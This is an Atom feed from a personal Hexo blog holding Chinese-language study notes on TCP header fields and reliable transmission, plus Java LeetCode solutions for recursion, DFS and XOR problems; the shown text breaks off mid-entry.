<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Fish</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-05-07T17:01:33.770Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>Fish</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>tcp</title>
    <link href="http://example.com/2021/05/08/NetWord/TCP/"/>
    <id>http://example.com/2021/05/08/NetWord/TCP/</id>
    <published>2021-05-07T16:46:41.151Z</published>
    <updated>2021-05-07T17:01:33.770Z</updated>
    
    <content type="html"><![CDATA[<p><img src="TCP.assets/032325597971641.jpg"></p><h2 id="各字段意义"><a href="#各字段意义" class="headerlink" title="各字段意义"></a>各字段意义</h2><h4 id="源-目的端口"><a href="#源-目的端口" class="headerlink" title="源/目的端口"></a>源/目的端口</h4><h4 id="序号-确认号"><a href="#序号-确认号" class="headerlink" title="序号/确认号"></a>序号/确认号</h4><ul><li><p>序号（seq)</p><p>发送方发送给接收方，表明下一次想要接收到数据的第一个数据字节编号</p></li><li><p>确认号</p><p>接收方发给发送方，表明接收方期望下一次发送过来的数据字节编号</p></li></ul><h4 id="数据偏移"><a href="#数据偏移" class="headerlink" title="数据偏移"></a>数据偏移</h4><p><img src="TCP.assets/image-20210502010252782.png"></p><ul><li>占4个bit（取值范围为5~15）</li><li>Header Length乘5等于TCP首部长度（也等于数据偏移）</li><li>首部长度范围（20~60）</li></ul><h4 id="保留"><a href="#保留" class="headerlink" title="保留"></a>保留</h4><p><img src="TCP.assets/image-20210502010551226.png"></p><ul><li>占6个bit，一般情况下全为0</li></ul><h4 id="U-A-P-R-S-F"><a href="#U-A-P-R-S-F" class="headerlink" title="U/A/P/R/S/F"></a>U/A/P/R/S/F</h4><p><img src="TCP.assets/image-20210502011017028.png"></p><h5 id="URG（Urgent）"><a href="#URG（Urgent）" class="headerlink" title="URG（Urgent）"></a>URG（Urgent）</h5><p>当<code>URG = 1</code>时，紧急指针字段才有效。表明当前报文段中有紧急数据，应优先尽快传送</p><h5 id="ACK（Acknowledgment）"><a href="#ACK（Acknowledgment）" class="headerlink" title="ACK（Acknowledgment）"></a>ACK（Acknowledgment）</h5><p>接收方用于回复发送方的标志，当<code>ACK = 1</code>时，确认号字段才有效</p><h5 id="PSH（Push）"><a href="#PSH（Push）" class="headerlink" title="PSH（Push）"></a>PSH（Push）</h5><h5 id="RST（Reset）"><a href="#RST（Reset）" class="headerlink" title="RST（Reset）"></a>RST（Reset）</h5><p>当<code>RST = 1</code>时，表明连接中出现严重差错，必须释放连接，然后再重新建立连接</p><h5 id="SYN（Synchronization）"><a href="#SYN（Synchronization）" class="headerlink" title="SYN（Synchronization）"></a>SYN（Synchronization）</h5><p>当<code>SYN = 1</code>、<code>ACK = 0</code> 时，表明这是一个建立连接的请求<br>若对方同意建立连接，则回复<code>SYN = 1</code>、<code>ACK = 1</code></p><h5 id="FIN（Finish）"><a href="#FIN（Finish）" class="headerlink" title="FIN（Finish）"></a>FIN（Finish）</h5><p>当<code>FIN = 1</code>时，表明数据已经发送完毕，要求释放连接</p><h4 id="窗口"><a href="#窗口" class="headerlink" title="窗口"></a>窗口</h4><ul><li>流量控制：告知对方下一次允许发送的数据大小</li></ul><h4 id="检验和"><a href="#检验和" class="headerlink" title="检验和"></a>检验和</h4><ul><li><p>伪首部+首部+数据部分</p><p>伪首部不会传输给下一层</p></li></ul><h4 id="紧急指针"><a href="#紧急指针" class="headerlink" title="紧急指针"></a>紧急指针</h4><h2 id="可靠传输"><a href="#可靠传输" class="headerlink" title="可靠传输"></a>可靠传输</h2><h3 id="ARQ（Automatic-Repeat-reQuest）"><a href="#ARQ（Automatic-Repeat-reQuest）" class="headerlink" title="ARQ（Automatic Repeat-reQuest）"></a>ARQ（Automatic Repeat-reQuest）</h3><ul><li><p>理想情况</p><p>发送方发送一个数据包，接收方就接受一个数据包</p><img src="TCP.assets/20210112202051753.png" style="zoom: 80%;" /></li><li><p>意外情况</p><ol><li><p>确认丢失</p></li><li><p>确认迟到</p></li></ol></li></ul><img src="TCP.assets/20210112202117497-1620406287643.png" style="zoom:80%;" /><ul><li>缺点：效率非常低</li></ul><h3 id="连续ARQ-滑动窗口"><a href="#连续ARQ-滑动窗口" class="headerlink" title="连续ARQ+滑动窗口"></a>连续ARQ+滑动窗口</h3><ul><li><p>SACK（selective 选择性确认）</p><p>包含于TCP首部可选部分</p></li><li><p>意外情况</p></li></ul><h2 id="流量控制"><a href="#流量控制" class="headerlink" title="流量控制"></a>流量控制</h2><h2 id="拥塞控制"><a href="#拥塞控制" class="headerlink" title="拥塞控制"></a>拥塞控制</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;TCP.assets/032325597971641.jpg&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;各字段意义&quot;&gt;&lt;a href=&quot;#各字段意义&quot; class=&quot;headerlink&quot; title=&quot;各字段意义&quot;&gt;&lt;/a&gt;各字段意义&lt;/h2&gt;&lt;h4 id=&quot;源-目</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>leetcode(2)</title>
    <link href="http://example.com/2021/04/27/LeetCode/leetcode2/"/>
    <id>http://example.com/2021/04/27/LeetCode/leetcode2/</id>
    <published>2021-04-27T00:42:54.382Z</published>
    <updated>2021-05-21T08:34:53.149Z</updated>
    
    <content type="html"><![CDATA[<p>主要是想练习下递归，学下递归思想，还有dfs。</p><h2 id="Hanota"><a href="#Hanota" class="headerlink" title="Hanota"></a>Hanota</h2><p><img src="leetcode2.assets/image-20210428202516782.png"></p><p>经典递归问题，从这道题学到的关于递归的思想挺多的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">move</span><span class="params">(<span class="keyword">int</span> size, List&lt;Integer&gt; A, List&lt;Integer&gt; B, List&lt;Integer&gt; C)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (size == <span class="number">1</span>)&#123;</span><br><span class="line">            C.add(A.remove(A.size() - <span class="number">1</span>));</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        move(size - <span class="number">1</span>, A, C, B);</span><br><span class="line">        C.add(A.remove(A.size() - <span class="number">1</span>));</span><br><span class="line">        move(size - <span class="number">1</span>, B, A, C);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">hanota</span><span class="params">(List&lt;Integer&gt; A, List&lt;Integer&gt; B, List&lt;Integer&gt; C)</span> </span>&#123;</span><br><span class="line">        move(A.size(), A, B, C);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Plaint"><a href="#Plaint" class="headerlink" title="Plaint"></a>Plaint</h2><p><img src="leetcode2.assets/image-20210428202649261.png"></p><p>经典的dfs问题，好像有一个比较高大上的名字叫做漫水算法？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span>[][] image, <span class="keyword">int</span>[][] sign, <span class="keyword">int</span> sr, <span class="keyword">int</span> sc, <span class="keyword">int</span> newColor)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (sign[sr][sc]  == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span>[][] step = &#123;&#123;<span class="number">1</span>, <span class="number">0</span>&#125;, &#123;-<span class="number">1</span>, <span class="number">0</span>&#125;,</span><br><span class="line">                &#123;<span class="number">0</span>, <span class="number">1</span>&#125;, &#123;<span class="number">0</span>, -<span class="number">1</span>&#125;&#125;;</span><br><span class="line">        <span class="keyword">int</span> width = image.length;</span><br><span class="line">        <span class="keyword">int</span> length = image[<span class="number">0</span>].length;</span><br><span class="line"></span><br><span class="line">        sign[sr][sc] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> temp = image[sr][sc];</span><br><span class="line">        image[sr][sc] = newColor;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> row = sr + step[i][<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">int</span> col = sc + step[i][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (row &gt;= width || row &lt; <span class="number">0</span> || col &gt;= length || col &lt; <span class="number">0</span> || sign[row][col] == <span class="number">1</span> || temp != image[row][col])&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            dfs(image, sign, row, col, newColor);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[][] floodFill(<span class="keyword">int</span>[][] image, <span class="keyword">int</span> sr, <span class="keyword">int</span> sc, <span class="keyword">int</span> newColor) &#123;</span><br><span class="line">        <span class="keyword">int</span>[][] sign = <span class="keyword">new</span> <span class="keyword">int</span>[image.length][image[<span class="number">0</span>].length];</span><br><span class="line">        dfs(image, sign ,sr, sc, newColor);</span><br><span class="line">        <span class="keyword">return</span> image;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="岛屿数量"><a href="#岛屿数量" class="headerlink" title="岛屿数量"></a>岛屿数量</h2><p><img src="leetcode2.assets/image-20210427092423860.png"></p><p>刷LeetCode第一次一遍过😁</p><p><img src="leetcode2.assets/image-20210427092622666.png"></p><ol><li>判断是否为水，或判断标记是否走过</li><li>dfs确定连在一起的岛的范围</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> height = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> width = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 上下左右改变</span></span><br><span class="line">    <span class="keyword">int</span>[][] step = &#123;&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;-<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">1</span>&#125;,&#123;<span class="number">0</span>,-<span class="number">1</span>&#125;&#125;;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">numIslandsDfs</span><span class="params">(<span class="keyword">char</span>[][] grid, <span class="keyword">int</span> row, <span class="keyword">int</span> col, <span class="keyword">int</span>[][] book)</span></span>&#123;</span><br><span class="line">        <span class="comment">//如果越界就返回</span></span><br><span class="line">        <span class="keyword">if</span> (row &lt; <span class="number">0</span> || row &gt;= height || col &lt; <span class="number">0</span> || col &gt;= width)<span class="keyword">return</span>;</span><br><span class="line">       </span><br><span class="line">        <span class="comment">// 如果是水域或者该点已经走过也返回</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (grid[row][col] == <span class="string">&#x27;0&#x27;</span> || book[row][col] == <span class="number">1</span>)<span class="keyword">return</span>;</span><br><span class="line">        book[row][col] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> post_x = row + step[i][<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">int</span> post_y = col + step[i][<span class="number">1</span>];</span><br><span class="line">            numIslandsDfs(grid, post_x, post_y, book);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numIslands</span><span class="params">(<span class="keyword">char</span>[][] grid)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 不用直接判断孤岛</span></span><br><span class="line"><span class="comment">        * 从0开始检索，如果book数组中没有标记且是陆地，则标记book</span></span><br><span class="line"><span class="comment">        * 开始dfs检索</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        height = grid.length;</span><br><span class="line">        width = grid[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">int</span> book[][]= <span class="keyword">new</span> <span class="keyword">int</span>[grid.length][grid[<span class="number">0</span>].length];</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 两层for循环来遍历所有坐标</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; height; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; width; j++) &#123;</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// 如果该坐标为水域或者标记为1就忽略</span></span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] == <span class="string">&#x27;0&#x27;</span> || book[i][j] == <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    numIslandsDfs(grid, i, j, book);</span><br><span class="line">                    count++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="矩阵中的路径"><a href="#矩阵中的路径" class="headerlink" title="矩阵中的路径"></a>矩阵中的路径</h2><p><img src="leetcode2.assets/image-20210428201315023.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">思路如下</span><br><span class="line"></span><br><span class="line">将返回值设置为false</span><br><span class="line">如果dfs出一个完整的单词链则将返回值设置为true，并且直接break</span><br><span class="line">遍历表，只对应单词的首字符</span><br><span class="line">首字母存在就直接进行dfs遍历，遍历的方向只有四个方向</span><br><span class="line">回溯，如果道路不符合需要把之前走过的路全部清0</span><br></pre></td></tr></table></figure><p>第一次写的代码最后三个检测点死活不能过，下面贴第一次写的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">     <span class="keyword">int</span>[][] step = &#123;&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;-<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">1</span>&#125;,&#123;<span class="number">0</span>,-<span class="number">1</span>&#125;&#125;;</span><br><span class="line">    <span class="keyword">int</span> height = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> width = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">boolean</span> objRet = <span class="keyword">false</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">existDfs</span><span class="params">(<span class="keyword">char</span>[][] board, <span class="keyword">int</span> row, <span class="keyword">int</span> col, <span class="keyword">int</span>[][] book, <span class="keyword">char</span>[] wordArray, <span class="keyword">int</span> wordIndex)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (wordIndex == wordArray.length)&#123;</span><br><span class="line">            <span class="keyword">this</span>.objRet = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (row &gt;= height || row &lt; <span class="number">0</span> || col &gt;= width || col &lt; <span class="number">0</span> ) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (book[row][col] == <span class="number">1</span> || board[row][col] != wordArray[wordIndex]) <span class="keyword">return</span>;</span><br><span class="line">        book[row][col] = <span class="number">1</span>;</span><br><span class="line">        wordIndex++;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> post_x = step[i][<span class="number">0</span>] + row;</span><br><span class="line">            <span class="keyword">int</span> post_y = step[i][<span class="number">1</span>] + col;</span><br><span class="line">    </span><br><span class="line">            existDfs(board, post_x, post_y, book, wordArray, wordIndex);</span><br><span class="line">        &#125;</span><br><span class="line">        book[row][col] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">exist</span><span class="params">(<span class="keyword">char</span>[][] board, String word)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">char</span>[] wordArray = word.toCharArray();</span><br><span class="line">        height = board.length;</span><br><span class="line">        width = board[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; board.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; board[<span class="number">0</span>].length; j++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (board[i][j] == wordArray[<span class="number">0</span>])&#123;</span><br><span class="line">                        <span class="keyword">int</span>[][] book = <span class="keyword">new</span> <span class="keyword">int</span>[height][width];</span><br><span class="line">                        <span class="comment">// 开始进行dfs搜索，如果搜索成功就将ret赋值为true</span></span><br><span class="line">                        existDfs(board,i,j,book,wordArray,<span class="number">0</span>);</span><br><span class="line">                        <span class="comment">// 判断在进行dfs后是否找到矩阵中相应单词</span></span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.objRet;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二次写的代码，虽然过了，但是效率也太低了。。。服了</p><p><img src="leetcode2.assets/image-20210428201652066.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">   <span class="keyword">int</span>[][] step = &#123;&#123;<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;-<span class="number">1</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="number">1</span>&#125;,&#123;<span class="number">0</span>,-<span class="number">1</span>&#125;&#125;;</span><br><span class="line">    <span class="keyword">int</span> height = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> width = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">existDfs</span><span class="params">(<span class="keyword">char</span>[][] board, <span class="keyword">int</span> row, <span class="keyword">int</span> col, <span class="keyword">int</span>[][] book, <span class="keyword">char</span>[] wordArray, <span class="keyword">int</span> wordIndex)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (row &gt;= height || row &lt; <span class="number">0</span> || col &gt;= width || col &lt; <span class="number">0</span>)<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (board[row][col] != wordArray[wordIndex] || book[row][col] == <span class="number">1</span>)<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (wordIndex == wordArray.length-<span class="number">1</span>)<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> ret = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> post_x = step[i][<span class="number">0</span>] + row;</span><br><span class="line">            <span class="keyword">int</span> post_y = step[i][<span class="number">1</span>] + col;</span><br><span class="line">            book[row][col] = <span class="number">1</span>;</span><br><span class="line">            ret =  existDfs(board, post_x, post_y, book, wordArray, wordIndex+<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (ret == <span class="keyword">true</span>)<span class="keyword">break</span>;</span><br><span class="line">            book[row][col] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">exist</span><span class="params">(<span class="keyword">char</span>[][] board, String word)</span> </span>&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 首先将返回值设置为false</span></span><br><span class="line"><span class="comment">        * 如果dfs出一个完整的单词链则将返回值设置为true，并且直接break</span></span><br><span class="line"><span class="comment">        *</span></span><br><span class="line"><span class="comment">        * 首先需要遍历表，只对应单词的首字符</span></span><br><span class="line"><span class="comment">        * 首字母存在就直接进行dfs遍历</span></span><br><span class="line"><span class="comment">        * 遍历的方向只有四个方向</span></span><br><span class="line"><span class="comment">        * 还需要回溯，如果道路不符合需要把之前走过的路全部清0</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span>[] wordArray = word.toCharArray();</span><br><span class="line">        height = board.length;</span><br><span class="line">        width = board[<span class="number">0</span>].length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; board.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; board[<span class="number">0</span>].length; j++) &#123;</span><br><span class="line">                <span class="keyword">int</span>[][] book = <span class="keyword">new</span> <span class="keyword">int</span>[height][width];</span><br><span class="line">                <span class="keyword">if</span> (existDfs(board,i,j,book,wordArray,<span class="number">0</span>))&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解码异或后的数组"><a href="#解码异或后的数组" class="headerlink" title="解码异或后的数组"></a>解码异或后的数组</h2><p><img src="leetcode2.assets/image-20210506163333259.png"></p><p>简单的签到题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">int</span>[] decode(<span class="keyword">int</span>[] encoded, <span class="keyword">int</span> first) &#123;</span><br><span class="line">        <span class="keyword">int</span> decodedLength = encoded.length + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span>[] decoded = <span class="keyword">new</span> <span class="keyword">int</span>[decodedLength];</span><br><span class="line">        decoded[<span class="number">0</span>] = first;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; encoded.length; i++) &#123;</span><br><span class="line">            decoded[i+<span class="number">1</span>] = encoded[i] ^ decoded[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> decoded;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="数组异或操作"><a href="#数组异或操作" class="headerlink" title="数组异或操作"></a>数组异或操作</h2><p><img src="leetcode2.assets/image-20210507191525048.png"></p><p><img src="leetcode2.assets/image-20210507191723896.png"></p><p>两天都是简单的签到题？感觉这道题随便都可以跑到100%</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">xorOperation</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> start)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> retNum = start;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            retNum ^= start+i*<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> retNum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="螺旋矩阵Ⅰ"><a href="#螺旋矩阵Ⅰ" class="headerlink" title="螺旋矩阵Ⅰ"></a>螺旋矩阵Ⅰ</h2><p>开始螺旋矩阵三部曲冲冲冲🐱‍🏍</p><p><img 